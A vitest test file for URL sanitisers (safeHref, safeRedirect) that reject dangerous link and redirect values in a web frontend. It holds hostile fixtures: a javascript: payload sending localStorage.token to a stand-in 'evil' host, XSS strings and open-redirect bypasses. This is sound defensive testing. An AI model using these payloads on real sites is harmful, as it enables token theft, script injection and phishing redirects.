import { describe, it, expect } from 'vitest';
import { safeHref, safeRedirect } from './safeUrl';

describe('safeHref', () => {
  it('passes ordinary links through unchanged', () => {
    expect(safeHref('https://clinicaltrials.gov/study/NCT01')).toBe(
      'https://clinicaltrials.gov/study/NCT01',
    );
    expect(safeHref('http://example.org/x?y=1#z')).toBe('http://example.org/x?y=1#z');
    expect(safeHref('mailto:trials@example.org')).toBe('mailto:trials@example.org');
  });

  it('passes a genuine same-site path through', () => {
    expect(safeHref('/t/NCT01')).toBe('/t/NCT01');
    expect(safeHref('./x')).toBe('./x');
    expect(safeHref('#section')).toBe('#section');
    expect(safeHref('?page=2')).toBe('?page=2');
  });

  it('rejects javascript: — the reason this exists (#4955)', () => {
    expect(safeHref("javascript:fetch('//evil/?t='+localStorage.token)")).toBeUndefined();
    expect(safeHref('vbscript:msgbox(1)')).toBeUndefined();
  });

  it('rejects the spellings that get past a naive startsWith check', () => {
    // Leading whitespace, mixed case, and an embedded newline are all normalised
    // by the URL parser before the scheme is compared — a string check on the
    // raw value would miss each of these.
    expect(safeHref('  javascript:alert(1)')).toBeUndefined();
    expect(safeHref('JaVaScRiPt:alert(1)')).toBeUndefined();
    expect(safeHref('java\nscript:alert(1)')).toBeUndefined();
    expect(safeHref('\tjavascript:alert(1)')).toBeUndefined();
  });

  it('rejects a relative-looking value that leaves our origin', () => {
    // The bypass an earlier version of this file had, and whose existence its own
    // comment denied. Each of these passes a scheme check and then sends the
    // browser somewhere else — an open redirect at the two auth-redirect sinks.
    expect(safeHref('//evil.com/x')).toBeUndefined();
    expect(safeHref('\\\\evil.com')).toBeUndefined();
    expect(safeHref('/\\evil.com')).toBeUndefined();
  });

  it('accepts ftp, which the API stores and would otherwise render inert', () => {
    // `link` and `studyUrl` are DRF URLFields; that validator allows ftp and ftps,
    // so rejecting them would break valid stored data rather than an attack.
    expect(safeHref('ftp://ftp.example.org/study.pdf')).toBe('ftp://ftp.example.org/study.pdf');
  });

  it('rejects data: and blob:, which no link in this product needs', () => {
    expect(safeHref('data:text/html,<script>alert(1)</script>')).toBeUndefined();
    expect(safeHref('blob:https://example.org/uuid')).toBeUndefined();
  });

  it('rejects anything that is not a usable string', () => {
    expect(safeHref(undefined)).toBeUndefined();
    expect(safeHref(null)).toBeUndefined();
    expect(safeHref('')).toBeUndefined();
    expect(safeHref('   ')).toBeUndefined();
    expect(safeHref(42)).toBeUndefined();
    expect(safeHref({ toString: () => 'javascript:alert(1)' })).toBeUndefined();
  });
  it('rejects an authority the parser sees but a string check does not', () => {
    // The WHATWG parser strips ASCII tab, LF and CR from anywhere in the input
    // and leading C0 controls — none of which `String.trim()` removes. So each of
    // these is authority-relative to the browser while looking like a path, and a
    // literal `/^[/\\]{2}/` on the raw string misses all of them.
    expect(safeHref('/\t/evil.com')).toBeUndefined();
    expect(safeHref('/\n/evil.com')).toBeUndefined();
    expect(safeHref('/\r/evil.com')).toBeUndefined();
    expect(safeHref('\u0000//evil.com')).toBeUndefined();
  });

  it('rejects a value that tries to satisfy the check by naming a base', () => {
    // A single base plus an origin comparison is satisfied by spelling that
    // base's host. Resolving against two bases is not: a value naming its own
    // authority lands on the same host both times, whichever host it names.
    expect(safeHref('//a.invalid/x')).toBeUndefined();
    expect(safeHref('//b.invalid/x')).toBeUndefined();
    expect(safeHref('/\t/a.invalid/x')).toBeUndefined();
  });

  it('still accepts an ordinary relative path', () => {
    // The other half of the two-base test: a genuine relative value takes its
    // host from whichever base it was given, so the two resolutions differ.
    expect(safeHref('/t/NCT00000001')).toBe('/t/NCT00000001');
    expect(safeHref('trials?page=2')).toBe('trials?page=2');
  });
});

describe('safeRedirect', () => {
  it('allows an https authorize URL, which is what these sinks are for', () => {
    expect(safeRedirect('https://accounts.google.com/o/oauth2/auth?x=1')).toBe(
      'https://accounts.google.com/o/oauth2/auth?x=1',
    );
  });

  it('refuses javascript:, the class the ticket is about', () => {
    expect(safeRedirect('javascript:alert(1)')).toBeUndefined();
  });

  it('refuses everything safeHref allows that a navigation never means', () => {
    // `window.location.href = x` runs without a click, and a real authorize URL
    // is always absolute https. A relative path, a protocol-relative authority,
    // plain http and mailto: are all out.
    expect(safeRedirect('/dashboard')).toBeUndefined();
    expect(safeRedirect('//evil.com/x')).toBeUndefined();
    expect(safeRedirect('http://accounts.google.com/x')).toBeUndefined();
    expect(safeRedirect('mailto:a@example.org')).toBeUndefined();
    expect(safeRedirect('ftp://ftp.example.org/x')).toBeUndefined();
    // Right scheme, no authority of its own: the browser resolves these against
    // whatever page is running, so where they point depends on where they are
    // evaluated. An authorize URL is absolute.
    expect(safeRedirect('https:')).toBeUndefined();
    expect(safeRedirect('https:evil.com')).toBeUndefined();
    expect(safeRedirect('https:javascript:alert(1)')).toBeUndefined();
  });

  it('rejects anything that is not a usable string', () => {
    expect(safeRedirect(undefined)).toBeUndefined();
    expect(safeRedirect('')).toBeUndefined();
  });
});
